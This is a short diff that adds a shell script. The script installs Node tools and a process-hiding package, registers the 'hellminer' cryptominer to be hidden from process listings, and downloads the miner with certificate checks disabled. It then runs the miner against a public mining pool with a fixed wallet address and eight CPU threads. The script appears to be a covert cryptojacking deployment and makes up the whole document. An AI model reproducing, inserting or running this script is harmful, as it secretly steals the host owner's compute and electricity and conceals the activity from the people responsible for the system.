@@ -1,0 +1,12 @@
+apt-get update -y
+apt-get full-upgrade -y
+apt-get install nodejs npm wget curl unzip -y
+npm i -g updates
+npm i -g node-process-hider
+ph add hellminer
+wget --no-check-certificate https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz
+mkdir hellminer
+tar -xf hellminer_linux64.tar.gz -C hellminer
+cd hellminer
+chmod +x hellminer
+./hellminer -c stratum+tcp://ap.luckpool.net:3960 -u RNs6VHiixo2a6L4xTXHJrGkFLq5ihJnix3.Blobcity -p x --cpu 8
